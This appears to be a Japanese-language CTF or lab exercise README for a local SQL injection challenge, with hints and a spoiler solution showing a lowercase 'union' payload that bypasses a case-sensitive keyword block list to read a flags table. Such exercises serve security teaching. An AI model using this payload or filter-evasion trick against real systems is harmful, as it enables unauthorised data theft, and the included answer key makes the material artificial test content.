# 04 - Case Filter Bypass

`http://localhost:3004`の商品検索から、`flags`テーブルのflagを表示せよ。
02と同じUNION Injectionだが、今回は`UNION`という入力がブロックされる。
この問題のテーマは、SQLキーワードの大文字小文字だけを変えてフィルタを通ること。

テーブル構成:

- `products(id, name, description, price)`
- `flags(id, flag)`

## ヒント

<details><summary>ヒント1</summary>

検索欄に`UNION`と入力するとブロックされる。`server.py`の`BLOCKED`を確認しよう。

</details>

<details><summary>ヒント2</summary>

フィルタは大文字の`UNION`だけを探している。一方、MySQLのキーワードは小文字でも動く。
02のpayloadにある`UNION`を小文字へ変えよう。

</details>

<details><summary>解答</summary>

検索欄へ次を入力する。

```
zzz' union SELECT id,flag,NULL,NULL FROM flags#
```

実行されるSQL:

```sql
SELECT id, name, description, price FROM products
WHERE name LIKE '%zzz' union SELECT id,flag,NULL,NULL FROM flags#%'
```

大文字の`UNION`は含まれないためフィルタを通過する。MySQLは小文字の`union`を
SQLキーワードとして扱うため、商品名の欄にflagが表示される。

</details>
